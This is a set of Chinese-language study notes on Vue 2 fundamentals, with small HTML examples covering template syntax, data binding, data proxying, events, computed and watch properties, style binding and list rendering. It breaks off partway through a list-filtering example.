第一章核心

## Vue简介

Vue.js 是一个用于构建用户界面的渐进式 JavaScript 框架。

- 采用**组件化**模式，提高代码复用率，且让代码更好的维护。
- **声明式**编码，让编程人员直接操作DOM,提高开发效率。

**声明式编码的特点**

1. **关注结果**：声明式编程更关注结果而非过程。开发者定义期望的输出，框架或库负责实现细节。
2. **高层次抽象**：声明式代码通常比命令式代码更简洁和易读，因为它省略了许多低层次的实现细节。
3. **可维护性强**：由于高层次的抽象，声明式代码更易于理解和维护。

**声明式编码的例子**

**1. HTML**

HTML 是声明式编程的一个典型例子。你定义页面元素及其属性，而不需要描述如何绘制这些元素。

```
<div id="app">
  <p>{{ message }}</p>
</div>
```

在这个例子中，你声明了一个包含文本的 `<p>` 元素，而不需要详细描述如何在页面上绘制这个文本。

**声明式 vs 命令式**

**命令式编码示例**

```
let numbers = [1, 2, 3, 4, 5];
let doubled = [];
for (let i = 0; i < numbers.length; i++) {
  doubled.push(numbers[i] * 2);
}
```

在命令式编码中，你详细描述了如何通过遍历数组来创建一个新的数组。

**声明式编码示例**

```
let numbers = [1, 2, 3, 4, 5];
let doubled = numbers.map(n => n * 2);
```

在声明式编码中，你使用 `map` 函数声明了你想要将每个数字乘以 2 而不需要描述遍历数组的具体步骤。

**结论**

声明式编码的优势在于简化代码、提高可读性和维护性，使得开发者可以专注于描述问题的本质而不是解决问题的具体步骤。在现代前端开发中，诸如 Vue.js、React 等框架广泛使用声明式编码范式来简化 UI 开发。

## Vue基础

### Vue开发环境搭建

官网地址： https://cn.vuejs.org/

![image-20240725134202917](upload\image-20240725134202917.png)



开发工具

![image-20240725142146064](upload\image-20240725142146064.png)



![image-20240725142207322](upload\image-20240725142207322.png)

**解决**Download the Vue Devtools extension for a better development experience:
https://github.com/vuejs/vue-devtools

直接点击链接

或者

https://v2.cn.vuejs.org/v2/guide/installation.html

![image-20240725142507139](upload\image-20240725142507139.png)



![image-20240725142524455](upload\image-20240725142524455.png)



![image-20240725142629945](upload\image-20240725142629945.png)

![image-20240725142703964](upload\image-20240725142703964.png)

![image-20240725142739179](upload\image-20240725142739179.png)

![image-20240725142805191](upload\image-20240725142805191.png)



**解决**You are running Vue in development mode.
Make sure to turn on production mode when deploying for production.
See more tips at https://vuejs.org/guide/deployment.html

![image-20240725143450858](upload\image-20240725143450858.png)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>认识Vue</title>
    <script type="text/javascript"  src="../js/vue.js"></script>
</head>
<body>
<script  type="text/javascript" >
    Vue.config.productionTip = false // 设置为 false 以阻止 vue 在启动时生成生产提示。
</script>
</body>
</html>
```

初识Vue
1.加让Vue工作，就必须倒建一个Vue实例，且要传入一个配置对象
2.app容器型的代码依然符合htm1规范。只不过混入了一些特的Vue比法
3.app容器型的代码被称为【Vue模板】

### Hello小案例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Hello word</title>
    <!-- 开发环境版本，包含了有帮助的命令行警告 -->
<!--    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>-->
    <!-- 生产环境版本，优化了尺寸和速度 -->
<!--    <script src="https://cdn.jsdelivr.net/npm/vue@2"></script>-->
    <script type="text/javascript"  src="../js/vue.js"></script>
</head>
<body>
<div id="app">
   {{name}}
</div>
<script  type="text/javascript" >
    /*数据对象*/
    var data = {
        name:'Hello Vue'
    }
    /*创建一个Vue实例*/
    const vm = new Vue({
        el: '#app',
        data: data
    })
</script>
</body>
</html>
```

### 模板语法

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>模板语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>插值语法</h1>
    <h3>你好，{{name}}</h3>
    <hr/>
    <h1>指令语法</h1>
    <a v-bind:href="school.url.toUpperCase()">点我去{{school.name}}学习1</a>
    <a :href="school.url">点我去{{school.name}}学习2</a>
</div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    new Vue({
        el: '#root',
        data: {
            name: 'jack',
            school: {
                name: 'zhuzq',
                url: 'http://www.zhuzq.com'
            }
        }
    });
</script>
</html>
```

Vue模板语法有2大类:
**插值语法:**
功能:用于解析标签体内容。
写法:{{xxx}}，xxx是js表达式，且可以直接读取data中的所有属性。
**指令语法:**
功能:用于解析标签(包括:标签属性、标签体内容、绑定事件.....) 。  
 举例:v-bind:href="xxx”或 简写为 :href="xxx"，xxx同样要写js表达式，
且可以直接读取到data中的所有属性。
各注:Vue中有很多的指令，且形式都是:v-????，此处只是拿v-bind举个例子。

### 数据绑定

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>数据绑定</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    单向数据绑定：<input type="text" v-bind:value="name"><br/><br/>
    双休数据绑定：<input type="text" v-model:value="name">

<!--    如下代码是错误的，因为v-model只能应用在表单类元素(输入类元素)-->
  <!--  <h2 v-bind:x="name">你好啊</h2>-->
</div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    new Vue({
        el: '#root',
        data: {
            name: 'jack',
        }
    });
</script>
</html>
```

Vue中有2种数据绑定的方式:
**单向绑定(v-bind)**:数据只能从data流向页面。

**双向绑定(v-model)**:数据不仅能从data流向页面，还可以从页面流向data。

备注:
双向绑定一般都应用在表单类元素上(如:input、select等)

v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

### data与el的2种写法

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>el与Data两种写法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>{{name}}</h1>
</div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    // const  vm = new Vue({
    //     // el: '#root',  // 第一种写法
    //
    //     // data 第一种写法 ：对象式
    //     data: {
    //         name: 'jack',
    //     }
    // });
    //
    // console.log(vm);
    // vm.$mount("#root")  // 第二种写法



    new Vue({
        el: '#root',
         //  data第二种写法：函数式
        data: function(){
            console.log('@@',this) // this对象是Vue实例对象
            return{
                name:'jack'
            }
        }
    });



</script>
</html>
```

el有2种写法

- new Vue时候配置e1属性。
- 先创建Vue实例，随后再通过vm.$mount('#root')指定e1的值。

data有2种写法

- 对象式
- 函数式

如何选择:目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。

一个重要的原则:
由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了

### MVVM模型

M：模型（Model）对应data中的数据

V：视图（View）模板

VM：视图模型（ViewModel）Vue实例对象

![img](upload\webp)


data中所有的属性，最后都出现在了vm身上。
vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。

### Object.defineProperty

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Object中defineProperty</title>
</head>
<body>
</body>
<script type="text/javascript">

    let number = 20
    let person = {
        name:'张三',
        sex : '男'
    }

    Object.defineProperty(person,'age',{
        // value:18,
        // enumerable:true,//控制属性是否可以枚举，默认值是false
        // writable:true,// 控制属性是否被修改，默认值是false
        // configurable:true,// 控制属性是否被删除，默认值是false
        // 当有人读取person的age属性时，get函数就会被调用，且返回值就是age的值
        get(){
            console.log('有人读取age属性了')
            return number;
        },
        set(value){
            console.log('有人修改了age属性了，且值是',value)
            number = value
        }
    })
    console.log(person)



</script>
</html>
```

![image-20240729142303310](upload\image-20240729142303310.png)

### 数据代理理解

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>数据代理</title>
</head>
<body>
</body>

<!--数据代理：通过一个对象代理对另外一个对象中的属性操作（读/写）-->
<script type="text/javascript">

    let obj1 = {x:100}
    let obj2 = {y:200}

    Object.defineProperty(obj2,'x',{
        get(){
            return obj1.x;
        },
        set(value){
            obj1.x = value
        }
    })



</script>
</html>
```

![image-20240729144158790](upload\image-20240729144158790.png)

### Vue中的数据代理

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue中的数据代理</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>学校名称：{{name}}</h1>
    <h2>学校地址：{{address}}</h2>
</div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    let data = {
        name:'湖南大学',
        address:'湖南长沙市'
    }
    const vm = new Vue({
        el: '#root',
        data: data
    });



</script>
</html>
```

![image-20240729145740278](upload\image-20240729145740278.png)



**Vue中的数据代理:**
通过vm对象来代理data对象中属性的操作(读/写)

**Vue中数据代理的好处:**
更加方便的操作data中的数据
**基本原理:**
通过object.defineProperty()把data对象中所有属性添加到vm上。
为每一个添加到vm上的属性，都指定一个getter/setter。
在getter/setter内部去操作(读/号)data中对应的属性。

### 事件处理

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>事件处理</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
    <h1>欢迎来到：{{name}} 学习</h1>
    <button v-on:click="showInfo" >点我提示信息</button><br/><br/>
    <button v-on:click="showInfo1($event,66)" >点我提示信息1</button><br/><br/>
    <button @click="showInfo" >点我提示信息2</button>
</div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el: '#root',
        data: {
            name:'http://www.zhuzq.com'
        },
        methods:{
            showInfo(event){
                console.log(event.target.innerText)
                console.log(this)
            },
            showInfo1(event,number){
                console.log(number)
            }
        }
    });



</script>
</html>
```

事件的基本使用:

- 使用v-on:xxx或@x绑定事件，其中xxx是事件名:
- 事件的回调需要配置在methods对象中，最终会在vm上;
- methods中配置的函数，不要用箭头函数!否则this就不是vm了;
- methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象;
- @click="demo"和 @click="demo($event)”效果一致，但后者可以传参;

### 事件修饰符

Vue中的事件修饰符:

- prevent:阳止默认事件(常用);
- stop:阳止事件冒泡(常用);
- once:事件只触发一次(常用);
- capture:使用事件的捕获模式:
- self:只有event.target是当前操作的元素是才触发事件:
- passive:事件的默认行为立即执行，无需等待事件回调执行完毕:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>事件修饰符</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
<style type="text/css">
    .demo{
        background-color: aquamarine;
        padding: 20px;
    }

    .box1{
        background-color: oldlace;
        padding: 20px;
    }

    .box2{
        background-color: orchid;
        padding: 20px;
    }

    .list{
        background-color: bisque;
        width: 200px;
        height: 200px;
        overflow: auto;
    }

    li{
        height: 100px;
    }

</style>


<div id="root">

       <!-- Vue中的事件修饰符:
        1.prevent:阳止默认事件(常用);
        2.stop:阳止事件冒泡(常用);
        3.once:事件只触发一次(常用);
        4.capture:使用事件的捕获模式:
        5.self:只有event.target是当前操作的元素是才触发事件:
        6.passive:事件的默认行为立即执行，无需等待事件回调执行完毕:-->

    <!--prevent-->
    <a href="http://www.baidu.com" @click.prevent="showInfo" >prevent事件修饰符</a><br/><br/>

    <!--stop-->
    <div class="demo" @click="showInfo">
        <button @click.stop="showInfo" >stop事件修饰符</button><br/><br/>
    </div>

    <!--once-->
    <button @click.once="showInfo" >once事件修饰符</button><br/><br/>


    <!--capture  冒泡由里向外  2 1  -->
    <div class="box1" @click="showMsg(1)">
        div1
        <div class="box2" @click="showMsg(2)"></div>
        div2
    </div>


    <!--self-->
    <div class="demo"  @click.self="selfMethod">
        <button @click="selfMethod" >selfMethod事件修饰符</button><br/><br/>
    </div>

  <!--  <ul @scroll.passive="scrollMethod" class="list">-->
    <ul @wheel.passive="scrollMethod" class="list">
        <li>1</li>
        <li>2</li>
        <li>3</li>
        <li>4</li>
        <li>5</li>

    </ul>


</div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el: '#root',
        data: {
            name:'http://www.zhuzq.com'
        },
        methods:{
            showInfo(event){
                alert('你好！')
            },
            showMsg(value){
                console.log(value)
            },
            selfMethod(e){
                console.log(e.target)
            },
            scrollMethod(){
                for(let i=0;i<10000; i++){
                    console.log('@')
                }
                console.log('加载完毕')
            }
        }
    });



</script>
</html>
```

### 键盘事件

Vue中常用的按键别名:

- 回车=>enter
- 删除 => delete(捕荻“删除”和“退格”键)
- 退出 =>esc
- 空格 =>space
- 换行 => tab
- 上=> up
- 下 => down
- 左 =>left
- 右=>right



vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case(短横线命名)

系统修饰键(用法特殊):ctrl、alt、shift、meta

配合keyup使用:按下修饰健的同时，再按下其他键，随后释放其他键，事件才被触发。

- 配合keydown使用:正常触发事件。
- 也可以使用keycode去指定具体的按键(不推荐)

Vue.config.keycodes.自定义键名 =键码，可以去定制按键别名

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>键盘事件</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>


   <!-- Vue中常用的按键别名:

    - 回车=>enter
    - 删除 => delete(捕荻“删除”和“退格”键)
    - 退出 =>esc
    - 空格 =>space
    - 换行 => tab
    - 上=> up
    - 下 => down
    - 左 =>left
    - 右=>right



    vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case(短横线命名)

    系统修饰键(用法特殊):ctrl、alt、shift、meta

    配合keyup使用:按下修饰健的同时，再按下其他键，随后释放其他键，事件才被触发。

    - 配合keydown使用:正常触发事件。
    - 也可以使用keycode去指定具体的按键(不推荐)

    Vue.config.keycodes.自定义键名 =键码，可以去定制按键别名-->



    <div id="root">
        <h1>欢迎来到：{{name}} 学习</h1>
        <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo"><br/><br/>
        <input type="text" placeholder="按下回车提示输入" @keyup.caps-lock="showInfo"><br/><br/>
        <input type="text" placeholder="按下回车提示输入" @keydown.ctrl="showInfo"><br/><br/>
        <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo"><br/><br/>
    </div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    Vue.config.keyCodes.huiche = 13  // 定义一个别名按键

    const vm = new Vue({
        el: '#root',
        data: {
            name:'http://www.zhuzq.com'
        },
        methods:{
            showInfo(e){
             // if(e.keyCode != 13){
             //    return;
             // }

                console.log(e.keyCode)
                // console.log(e.target.value)
            }
        }

    });


</script>
</html>
```

### 计算属性

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>计算属性——姓名案例</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        姓：<input type="text" v-model="firstName"><br/><br/>
        名：<input type="text" v-model="lastName"><br/><br/>
        姓名：<span>{{fullName()}}</span><br/><br/>

        姓名：<span>{{fullNameByComputed}}</span>

    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。



    const vm = new Vue({
        el: '#root',
        data: {
            firstName:'张',
            lastName:'三'
        },
        methods:{
            fullName(){
                return this.firstName+'-'+this.lastName
            }
        },
        computed:{
            fullNameByComputed:{
                get(){
                    console.log('get被调用了')
                    return this.firstName+'-'+this.lastName
                },
                set(value){
                    debugger
                    console.log('set',value)
                    let  arr = value.splice("-");
                    this.firstName = arr[0]
                    this.lastName = arr[1]
                }
            }
        }
    });


</script>
</html>
```

### 计算属性-简写

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>计算属性简写——姓名案例</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        姓：<input type="text" v-model="firstName"><br/><br/>
        名：<input type="text" v-model="lastName"><br/><br/>
        姓名：<span>{{fullName}}</span><br/><br/>


    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。



    const vm = new Vue({
        el: '#root',
        data: {
            firstName:'张',
            lastName:'三'
        },

        computed:{
            fullName(){
                console.log('get被调用了')
                return this.firstName+'-'+this.lastName
            }
        }
    });


</script>
</html>
```

### 天气案例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>天气案例</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>

    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。



    const vm = new Vue({
        el: '#root',
        data: {
            isHot:true,
        },
        computed:{
            info(){
               return this.isHot ? '炎热' :'凉爽'
            }
        },
        methods:{
            changeWeather(){
                this.isHot =  !this.isHot
            }
        }
    });


</script>
</html>
```

### 监视属性

监视屈性watch:
当被监视的属性变化时，回调函数自动调用，进行相关操作

监视的属性必须存在，才能进行监视!!

监视的两种写法:
new Vue时传入watch配置
通过vm.$watch监视

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>监视属性</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>

    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。



    const vm = new Vue({
        el: '#root',
        data: {
            isHot:true,
        },
        computed:{
            info(){
               return this.isHot ? '炎热' :'凉爽'
            }
        },
        methods:{
            changeWeather(){
                this.isHot =  !this.isHot
            }
        },
        // watch:{
        //     isHot:{
        //         immediate:true,// 初始化的时候调用一下handler
        //         handler(newValue,oldValue){
        //             // 当isHost发送改变时候调用一下
        //             console.log('isHost修改了',newValue,oldValue)
        //         }
        //     }
        // }
    });

    vm.$watch('isHot',{
                immediate:true,// 初始化的时候调用一下handler
                handler(newValue,oldValue){
                    // 当isHost发送改变时候调用一下
                    console.log('isHost修改了',newValue,oldValue)
                }
    });



</script>
</html>
```

### 深度监视

深度监视:
Vue中的watch默认不监测对象内部值的改变(一层)

配置deep;true可以监测对象内部值改变(多层)。
备注:

- Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以!
- 使用watch时根据数据的具体结构，决定是否采用深度监视。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>深度监视</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button><br/><br/>
        <button @click="person.age++">让我age++</button><br/><br/>
        <button @click="person.score++">让我score++</button>

        <h2>age:{{person.age}}</h2>
        <h2>score:{{person.score}}</h2>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。



    const vm = new Vue({
        el: '#root',
        data: {
            isHot:true,
            person:{
                age:18,
                score:98
            }
        },
        computed:{
            info(){
               return this.isHot ? '炎热' :'凉爽'
            }
        },
        methods:{
            changeWeather(){
                this.isHot =  !this.isHot
            }
        },
      /*  watch:{
            'person.age':{
                // 监视多级结构中的某个属性
                immediate:true,// 初始化的时候调用一下handler
                handler(newValue,oldValue){
                    // 当isHost发送改变时候调用一下
                    console.log('person.age',newValue,oldValue)
                }
            }
        }*/

          watch:{
            'person':{
                deep:true,
                immediate:true,// 初始化的时候调用一下handler
                handler(newValue,oldValue){
                    // 当isHost发送改变时候调用一下
                    console.log('person',newValue,oldValue)
                }
            }
        }
    });




</script>
</html>
```

### 深度监视简写形式

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>深度监视简写形式</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button><br/><br/>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。



    const vm = new Vue({
        el: '#root',
        data: {
            isHot:true
        },
        computed:{

            // 完整写法
            // info:{
            //     get(){},
            //     sel(value){},
            // },


            // 简写
            info(){
               return this.isHot ? '炎热' :'凉爽'
            }
        },
        methods:{
            changeWeather(){
                this.isHot =  !this.isHot
            }
        },

          watch:{
              // 正常写法
              // 'isHot':{
              //     // 监视多级结构中的某个属性
              //     immediate:true,// 初始化的时候调用一下handler
              //     handler(newValue,oldValue){
              //         // 当isHost发送改变时候调用一下
              //         console.log('isHot',newValue,oldValue)
              //     }
              // }

              // 简写
              'isHot'(newValue,oldValue){
                    // 当isHost发送改变时候调用一下
                    console.log('isHot',newValue,oldValue)
                }
        }
    });


    // 正常写法
    // vm.$watch('isHot',{
    //     immediate:true,// 初始化的时候调用一下handler
    //     handler(newValue,oldValue){
    //         // 当isHost发送改变时候调用一下
    //         console.log('isHost修改了',newValue,oldValue)
    //     }
    // });


    // vm.$watch('isHot',(newValue,oldValue)=>{
    //     console.log('isHot',newValue,oldValue,this)
    // });



</script>
</html>
```

### watch与omputed比较

computed和watch之间的区别:
computed能完成的功能，watch都可以完成。
watch能完成的功能，computed不一定能完成，例如:watch可以进行异步操作，两个重要的小原则:
所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。

所有不被Vue所管理的函数(定时器的回调函数、ajax的回调函数等)，最好写成箭头函数,这样this的指向才是vm 或组件实例对象。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>watch与computed比较</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        姓：<input type="text" v-model="firstName"><br/><br/>
        名：<input type="text" v-model="lastName"><br/><br/>
        姓名：<span>{{fullName}}</span><br/><br/>


    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。



    const vm = new Vue({
        el: '#root',
        data: {
            firstName:'张',
            lastName:'三',
            fullName:'张-三'
        },

        computed:{
            // fullName(){
            //     console.log('get被调用了')
            //
            //     setTimeout(()=>{
            //         console.log(this)
            //         return this.firstName+'-'+this.lastName
            //     })
            //
            //     return 1000;
            //
            //
            // }
        },
        watch:{
            firstName(val){

                setTimeout(()=>{
                    console.log(this) // vue
                    this.fullName =  val+'-'+this.lastName
                },1000)


            },
            lastName(val){
                this.fullName =  this.firstName +'-'+ val
            }
        }
    });


</script>
</html>
```

### 绑定class样式

class样式

- 写法:class="xxx"  xxx可以是字符串、对象、数组。
- 字符中写法适用于:类名不确定，要动态获取。
- 对象写法适用于:要绑定多个样式，个数不确定，名字也不确定。
- 数组写法适用于:要绑定多个样式，个数确定，名字也确定，但不确定用不用。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>绑定class样式</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <style type="text/css">
        .basic{
            width: 200px;
            height: 100px;
            border: 1px solid black;
        }

        .nomal{
            background-color: azure;
        }

        .class1{
            background-color: aquamarine;
        }

        .class2{
            background-color: bisque;
        }

        .class3{
            background-color: #ff7fea;
        }


    </style>

    <div id="root">
        <div>{{name}}</div><br/><br/>
        <!--绑定class样式，字符串写法，适用于：样式名不确定，需要动态指定-->
        <div class="basic" :class="mood">{{name}}</div><br/><br/>

        <!--数组写法，绑定样式不确定，名称也不确定-->
        <div class="basic" :class="classArr">{{name}}</div><br/><br/>

        <!--对象写法，绑定样式个数确定，名称不确定-->
        <div class="basic" :class="classObj" >{{name}}</div><br/><br/>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el: '#root',
        data: {
            name:"好好学习，天天向上",
            mood:"nomal",
            classArr:['class1','class2','class3'],
            classObj:{
                class1:true,
                class2:true
            }
        }
    });


</script>
</html>
```

### 绑定style样式

style样式

- :style="{fontsize:xxx}"其中xxx是动态值。
- :style="[a,b]"其中a、b是样式对象。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>绑定style样式</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>


    <div id="root">
        <div>{{name}}</div><br/><br/>
        <div class="basic" :style="styleObj">{{name}}</div><br/><br/>

        <div class="basic" :style="styleArr">{{name}}</div><br/><br/>

    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el: '#root',
        data: {
            name:"好好学习，天天向上",
            mood:"nomal",
            styleObj:{
                fontSize:'40px',
                color:'red'
            },
            styleArr:[
                {fontSize:'40px'},
                { color:'red'}
            ]
        }
    });


</script>
</html>
```

### 条件渲染

v-if
写法:

- v-if="表达式"

- v-else-if="表达式”

- v-else="表达式"

  用于:切换频率较低的场景。
  特点:不展示的DOM元素直接被移除。
  注意:v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
  
  v-show
  写法:

  v-show="表达式”
  适用于:切换频率较高的场景。
  特点:不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

  备注:使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>条件渲染</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>


    <div id="root">

        <!--v-show-->
        <div v-show="isShow">{{name}}</div><br/><br/>

        <div v-if="n===1">Java</div>
        <div v-else-if="n===2">Mysql</div>
        <div v-else="n===3">Vue</div>

        <!--template不影响结构-->
        <template v-show="n === 1">
            <h2>111</h2>
            <h2>222</h2>
            <h2>333</h2>
        </template>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el: '#root',
        data: {
            name:"好好学习，天天向上",
            isShow:true,
            n:1,
        }
    });


</script>
</html>
```

### 列表渲染

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>列表渲染</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        <h2>列表人员</h2>
        <ul>
            <!--v-for in 遍历数组-->
            <li v-for="(item, index) in personArr" :key="item.id">
               {{index}}-- {{ item.name }} -- {{ item.age }}
            </li>

        </ul>
        <hr>

        <ul>
            <!--v-for of遍历数组-->
            <li v-for="(item, index) of personArr" :key="item.id">
                {{index}}-- {{ item.name }} -- {{ item.age }}
            </li>
        </ul>

        <hr>

        <ul>
            <!--遍历对象-->
            <li v-for="(value, name,index) in person"  :key="index">
                {{index}}-- {{ name}} -- {{ value }}
            </li>
        </ul>


        <hr>

        <ul>
            <!--遍历字符串-->
            <li v-for="(value,index) in str"  :key="index">
                {{ index}} -- {{ value }}
            </li>
        </ul>
        <hr>
        <ul>
            <!--遍历指定次数-->
            <li v-for="item in 10">
                {{ item}}
            </li>
        </ul>


    </div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el: '#root',
        data: {
            name: "好好学习，天天向上",
            personArr: [
                {id: 1, name: '张三', age: 48},
                {id: 2, name: '李四', age: 18},
                {id: 3, name: '王五', age: 28},
            ],
            person: {
                id: 1,
                name: '张三',
                age: 48
            },
            str:'hello'
        }
    });


</script>
</html>
```

### 列表渲染key原理

面试题:react、vue中的key有什么作用?(key的内部原理)
**虚拟DOM中key的作用:**
key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下:
**对比规则:**
旧虚拟DOM中找到了与新虚拟DOM相同的key:

- 若虚拟DOM中内容没变，直按使用之前的真实DOM
- 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM。
- 旧虚拟DOM中未找到与新虚拟D0M相同的key创建新的真实DOM，随后渲染到到页面。

**用index作为key可能会引发的问题:**

若对数据进行:逆序添加、逆序删除等破坏顺序操作:
	会产生没有必要的真实DOM更新==>界面效果没问题，但效率低。

如果结构中还包含输入类的DOM:

​	会产生错误DOM更新 ==>界面有问题。

**开发中如何选择key;**
最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值。

如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示,使用index作为key是没有问题的。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>列表key原理</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
        <h2>列表人员</h2>

        <button @click="add">添加一行</button>
        <ul>
            <!--v-for in 遍历数组-->
            <li v-for="(item, index) in personArr" :key="item.id">
               {{index}}-- {{ item.name }} -- {{ item.age }}
                <input type="text">
            </li>

        </ul>
    </div>

</body>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    const vm = new Vue({
        el: '#root',
        data: {
            personArr: [
                {id: 1, name: '张三', age: 48},
                {id: 2, name: '李四', age: 18},
                {id: 3, name: '王五', age: 28},
            ]

        }
        , methods:{
            add(){
                let p = {id: 4, name: '老六', age: 16}
                this.personArr.unshift(p)
            }
        }

    });


</script>
</html>
```



问题：向数组添加一行， ：key是index存在问题。：key应该是唯一属性

![](upload\image-20240802103158652.png)

![](upload\image-20240802103224504.png)

### 列表过滤

**使用computed**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>列表过滤</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>

    <div id="root">
